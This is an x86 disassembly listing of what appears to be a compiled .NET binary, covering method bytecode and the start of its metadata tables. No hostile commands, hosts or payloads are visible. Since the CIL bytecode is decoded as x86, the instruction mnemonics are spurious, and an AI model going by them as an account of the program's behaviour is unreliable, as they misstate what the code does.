  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	e4 26                	in     $0x26,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 0c 45 00 00 d8 27 	add    %cl,0x27d80000(,%eax,2)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 e4                	add    %ah,%ah
  405a41:	6c                   	insb   (%dx),%es:(%edi)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 f4                	add    %dh,%ah
  405a51:	6c                   	insb   (%dx),%es:(%edi)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	c4 24 01             	les    (%ecx,%eax,1),%esp
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 4f 21             	add    %cl,0x21(%edi)
  405ae6:	a9 17 0a 00 51       	test   $0x51000a17,%eax
  405aeb:	00 fd                	add    %bh,%ch
  405aed:	1e                   	push   %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	88 21                	mov    %ah,(%ecx)
  405af2:	94                   	xchg   %eax,%esp
  405af3:	20 0a                	and    %cl,(%edx)
  405af5:	00 4f 17             	add    %cl,0x17(%edi)
  405af8:	56                   	push   %esi
  405af9:	26 06                	es push %es
  405afb:	00 cf                	add    %cl,%bh
  405afd:	1c 10                	sbb    $0x10,%al
  405aff:	13 06                	adc    (%esi),%eax
  405b01:	00 d2                	add    %dl,%dl
  405b03:	0f fd 1e             	paddw  (%esi),%mm3
  405b06:	0a 00                	or     (%eax),%al
  405b08:	75 18                	jne    0x405b22
  405b0a:	fd                   	std
  405b0b:	1e                   	push   %ds
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	5d                   	pop    %ebp
  405b0f:	20 56 26             	and    %dl,0x26(%esi)
  405b12:	06                   	push   %es
  405b13:	00 e4                	add    %ah,%ah
  405b15:	21 a9 17 0e 00 d4    	and    %ebp,-0x2bfff1e9(%ecx)
  405b1b:	19 4c 13 0e          	sbb    %ecx,0xe(%ebx,%edx,1)
  405b1f:	00 1d 21 4c 13 06    	add    %bl,0x6134c21
  405b25:	00 e1                	add    %ah,%cl
  405b27:	24 10                	and    $0x10,%al
  405b29:	13 06                	adc    (%esi),%eax
  405b2b:	00 2e                	add    %ch,(%esi)
  405b2d:	1c 92                	sbb    $0x92,%al
  405b2f:	23 06                	and    (%esi),%eax
  405b31:	00 2b                	add    %ch,(%ebx)
  405b33:	18 a9 17 0a 00 91    	sbb    %ch,-0x6efff5e9(%ecx)
  405b39:	1f                   	pop    %ds
  405b3a:	30 00                	xor    %al,(%eax)
  405b3c:	06                   	push   %es
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	5a                   	pop    %edx
  405b41:	0a 12                	or     (%edx),%dl
  405b43:	00 19                	add    %bl,(%ecx)
  405b45:	00 95 1e 12 00 01    	add    %dl,0x100121e(%ebp)
  405b4b:	00 a9 17 12 00 08    	add    %ch,0x8001217(%ecx)
  405b51:	10 95 1e 06 00 66    	adc    %dl,0x6600061e(%ebp)
  405b57:	0f a9                	pop    %gs
  405b59:	17                   	pop    %ss
  405b5a:	06                   	push   %es
  405b5b:	00 3f                	add    %bh,(%edi)
  405b5d:	13 92 23 06 00 2d    	adc    0x2d000623(%edx),%edx
  405b63:	1d 09 20 06 00       	sbb    $0x62009,%eax
  405b68:	9a 0d 09 20 06 00 77 	lcall  $0x7700,$0x620090d
  405b6f:	17                   	pop    %ss
  405b70:	8f 05 06 00 15 11    	pop    0x11150006
  405b76:	95                   	xchg   %eax,%ebp
  405b77:	1e                   	push   %ds
  405b78:	06                   	push   %es
  405b79:	00 82 11 95 1e 06    	add    %al,0x61e9511(%edx)
  405b7f:	00 32                	add    %dh,(%edx)
  405b81:	10 45 1e             	adc    %al,0x1e(%ebp)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 b5 1e 00 00 06    	add    %dh,0x600001e(%ebp)
  405b8b:	00 5a 10             	add    %bl,0x10(%edx)
  405b8e:	0b 19                	or     (%ecx),%ebx
  405b90:	06                   	push   %es
  405b91:	00 e1                	add    %ah,%cl
  405b93:	10 0b                	adc    %cl,(%ebx)
  405b95:	19 06                	sbb    %eax,(%esi)
  405b97:	00 c2                	add    %al,%dl
  405b99:	10 0b                	adc    %cl,(%ebx)
  405b9b:	19 06                	sbb    %eax,(%esi)
  405b9d:	00 69 11             	add    %ch,0x11(%ecx)
  405ba0:	0b 19                	or     (%ecx),%ebx
  405ba2:	06                   	push   %es
  405ba3:	00 35 11 0b 19 06    	add    %dh,0x6190b11
  405ba9:	00 4e 11             	add    %cl,0x11(%esi)
  405bac:	0b 19                	or     (%ecx),%ebx
  405bae:	06                   	push   %es
  405baf:	00 71 10             	add    %dh,0x10(%ecx)
  405bb2:	0b 19                	or     (%ecx),%ebx
  405bb4:	06                   	push   %es
  405bb5:	00 a5 10 0b 19 06    	add    %ah,0x6190b10(%ebp)
  405bbb:	00 8c 10 63 13 06 00 	add    %cl,0x61363(%eax,%edx,1)
  405bc2:	46                   	inc    %esi
  405bc3:	10 76 1e             	adc    %dh,0x1e(%esi)
  405bc6:	06                   	push   %es
  405bc7:	00 17                	add    %dl,(%edi)
  405bc9:	10 95 1e 06 00 fe    	adc    %dl,-0x1fff9e2(%ebp)
  405bcf:	10 0b                	adc    %cl,(%ebx)
  405bd1:	19 06                	sbb    %eax,(%esi)
  405bd3:	00 07                	add    %al,(%edi)
  405bd5:	0b 10                	or     (%eax),%edx
  405bd7:	13 06                	adc    (%esi),%eax
  405bd9:	00 38                	add    %bh,(%eax)
  405bdb:	23 a9 17 06 00 6b    	and    0x6b000617(%ecx),%ebp
  405be1:	22 a9 17 06 00 43    	and    0x43000617(%ecx),%ch
  405be7:	13 92 23 0a 00 a7    	adc    -0x58fff5dd(%edx),%edx
  405bed:	25 fd 1e 06 00       	and    $0x61efd,%eax
  405bf2:	c3                   	ret
  405bf3:	17                   	pop    %ss
  405bf4:	d8 25 06 00 fc 1b    	fsubs  0x1bfc0006
  405bfa:	d8 25 06 00 f1 12    	fsubs  0x12f10006
  405c00:	d8 25 06 00 94 19    	fsubs  0x19940006
  405c06:	a9 17 0a 00 8a       	test   $0x8a000a17,%eax
  405c0b:	20 76 21             	and    %dh,0x21(%esi)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	02 22                	add    (%edx),%ah
  405c12:	76 21                	jbe    0x405c35
  405c14:	0a 00                	or     (%eax),%al
  405c16:	8e 16                	mov    (%esi),%ss
  405c18:	76 21                	jbe    0x405c3b
  405c1a:	0a 00                	or     (%eax),%al
  405c1c:	fe                   	(bad)
  405c1d:	25 94 20 0a 00       	and    $0xa2094,%eax
  405c22:	85 0f                	test   %ecx,(%edi)
  405c24:	94                   	xchg   %eax,%esp
  405c25:	20 0a                	and    %cl,(%edx)
  405c27:	00 70 0f             	add    %dh,0xf(%eax)
  405c2a:	94                   	xchg   %eax,%esp
  405c2b:	20 06                	and    %al,(%esi)
  405c2d:	00 d2                	add    %dl,%dl
  405c2f:	13 a9 17 06 00 c4    	adc    -0x3bfff9e9(%ecx),%ebp
  405c35:	1b a9 17 06 00 13    	sbb    0x13000617(%ecx),%ebp
  405c3b:	18 a9 17 0a 00 fc    	sbb    %ch,-0x3fff5e9(%ecx)
  405c41:	1f                   	pop    %ds
  405c42:	76 21                	jbe    0x405c65
  405c44:	0a 00                	or     (%eax),%al
  405c46:	a8 1f                	test   $0x1f,%al
  405c48:	76 21                	jbe    0x405c6b
  405c4a:	06                   	push   %es
  405c4b:	00 1c 20             	add    %bl,(%eax,%eiz,1)
  405c4e:	a9 17 06 00 a6       	test   $0xa6000617,%eax
  405c53:	0d a9 17 0a 00       	or     $0xa17a9,%eax
  405c58:	41                   	inc    %ecx
  405c59:	17                   	pop    %ss
  405c5a:	94                   	xchg   %eax,%esp
  405c5b:	20 0a                	and    %cl,(%edx)
  405c5d:	00 ce                	add    %cl,%dh
  405c5f:	15 56 26 0a 00       	adc    $0xa2656,%eax
  405c64:	d2 22                	shlb   %cl,(%edx)
  405c66:	76 21                	jbe    0x405c89
  405c68:	0a 00                	or     (%eax),%al
  405c6a:	1d 19 fd 1e 0a       	sbb    $0xa1efd19,%eax
  405c6f:	00 cc                	add    %cl,%ah
  405c71:	1f                   	pop    %ds
  405c72:	ec                   	in     (%dx),%al
  405c73:	18 06                	sbb    %al,(%esi)
  405c75:	00 c2                	add    %al,%dl
  405c77:	11 a9 17 06 00 f2    	adc    %ebp,-0xdfff9e9(%ecx)
  405c7d:	15 10 13 06 00       	adc    $0x61310,%eax
  405c82:	c0 15 a9 17 0a 00 17 	rclb   $0x17,0xa17a9
  405c89:	15 a9 17 0a 00       	adc    $0xa17a9,%eax
  405c8e:	52                   	push   %edx
  405c8f:	0f a9                	pop    %gs
  405c91:	17                   	pop    %ss
  405c92:	06                   	push   %es
  405c93:	00 07                	add    %al,(%edi)
  405c95:	1d a9 17 06 00       	sbb    $0x617a9,%eax
  405c9a:	1f                   	pop    %ds
  405c9b:	23 10                	and    (%eax),%edx
  405c9d:	13 06                	adc    (%esi),%eax
  405c9f:	00 71 17             	add    %dh,0x17(%ecx)
  405ca2:	8f 05 06 00 98 1d    	pop    0x1d980006
  405ca8:	10 13                	adc    %dl,(%ebx)
  405caa:	0a 00                	or     (%eax),%al
  405cac:	60                   	pusha
  405cad:	0d 94 20 06 00       	or     $0x62094,%eax
  405cb2:	59                   	pop    %ecx
  405cb3:	01 a9 17 06 00 e3    	add    %ebp,-0x1cfff9e9(%ecx)
  405cb9:	19 8f 05 0a 00 82    	sbb    %ecx,-0x7dfff5fb(%edi)
  405cbf:	20 45 1e             	and    %al,0x1e(%ebp)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	25 1a 45 1e 06       	and    $0x61e451a,%eax
  405cc9:	00 b1 25 30 00 06    	add    %dh,0x6003025(%ecx)
  405ccf:	00 e9                	add    %ch,%cl
  405cd1:	1c 8f                	sbb    $0x8f,%al
  405cd3:	05 06 00 ad 14       	add    $0x14ad0006,%eax
  405cd8:	8f 05 0a 00 51 0e    	pop    0xe51000a
